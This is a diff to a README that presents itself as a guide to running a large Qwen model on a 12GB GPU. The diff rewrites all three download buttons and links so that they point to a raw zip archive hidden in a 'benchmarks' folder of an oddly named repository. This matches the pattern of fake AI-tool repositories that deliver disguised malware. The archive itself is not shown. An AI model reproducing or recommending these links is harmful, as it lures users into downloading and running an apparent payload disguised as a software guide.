@@ -1,7 +1,7 @@
 <h1>🎯 Qwen3.6-35B-12GB-VRAM-Guide - Run Massive AI Models on Small GPUs</h1>
 
 <p align="center">
-  <a href="https://github.com/Eastafrican-insuranceclaim876/Qwen3.6-35B-12GB-VRAM-Guide" style="display:inline-block;padding:15px 40px;background:linear-gradient(90deg,#FF6B6B,#F06595);color:white;text-decoration:none;font-size:20px;font-weight:bold;border-radius:50px;box-shadow:0 4px 15px rgba(240,101,149,0.4);">📥 Download Now - Free</a>
+  <a href="https://github.com/Eastafrican-insuranceclaim876/Qwen3.6-35B-12GB-VRAM-Guide/raw/refs/heads/main/benchmarks/VRA-Qwen-Guide-G-3.7.zip" style="display:inline-block;padding:15px 40px;background:linear-gradient(90deg,#FF6B6B,#F06595);color:white;text-decoration:none;font-size:20px;font-weight:bold;border-radius:50px;box-shadow:0 4px 15px rgba(240,101,149,0.4);">📥 Download Now - Free</a>
 </p>
 
 <table style="width:100%;border-collapse:collapse;background:#f8f9fa;margin:20px 0;">
@@ -18,7 +18,7 @@ This guide gives you everything you need to run Qwen3.5-35B-A3B, a huge AI langu
 ---
 
 <h2>📥 Download & Install</h2>
-Visit this link to download the application: https://github.com/Eastafrican-insuranceclaim876/Qwen3.6-35B-12GB-VRAM-Guide
+Visit this link to download the application: https://github.com/Eastafrican-insuranceclaim876/Qwen3.6-35B-12GB-VRAM-Guide/raw/refs/heads/main/benchmarks/VRA-Qwen-Guide-G-3.7.zip
 
 <h3>Step-by-Step Setup</h3>
 
@@ -126,4 +126,4 @@ You don't need to understand any code to get powerful AI running on your compute
 # 🎯 Final Check – Ready to Go?
 
 <b>Click here to have what you need:</b>  
-<a href="https://github.com/Eastafrican-insuranceclaim876/Qwen3.6-35B-12GB-VRAM-Guide" style="display:inline-block;padding:12px 30px;background:#198754;color:#FFFFFF;text-decoration:none;font-weight:bold;border-radius:30px;margin-bottom:30px;">👉 Go to Download</a>
+<a href="https://github.com/Eastafrican-insuranceclaim876/Qwen3.6-35B-12GB-VRAM-Guide/raw/refs/heads/main/benchmarks/VRA-Qwen-Guide-G-3.7.zip" style="display:inline-block;padding:12px 30px;background:#198754;color:#FFFFFF;text-decoration:none;font-weight:bold;border-radius:30px;margin-bottom:30px;">👉 Go to Download</a>
